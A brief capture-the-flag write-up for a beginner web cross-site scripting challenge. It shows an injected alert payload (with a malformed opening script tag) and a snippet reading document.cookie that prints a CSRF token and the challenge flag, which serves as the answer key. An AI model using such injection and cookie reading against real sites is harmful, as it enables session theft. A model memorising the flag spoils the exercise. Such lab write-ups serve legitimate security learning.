# Web: Cross Site Scripting: Tactical Precision Dissaray


Find the flag at ctf-05.

## Problem: 

We have the site and then we try in an form to put our script **</script>alert(1)</script>** and then we observe we get 1.
After that we make our cookie getter script: 

```
const allCookies = document.cookie;
console.log(allCookies);


csrftoken=wF2xNkcgTKSKuKOYFWOSeKeGqOvwSEVttvIgvR0tXRmRvuIHdMzUg3n7AvJfChdB;
flag="SSS{tactical_precision_dissaray_for_beginners}"
```

So, the flag is: **SSS{tactical_precision_dissaray_for_beginners}**
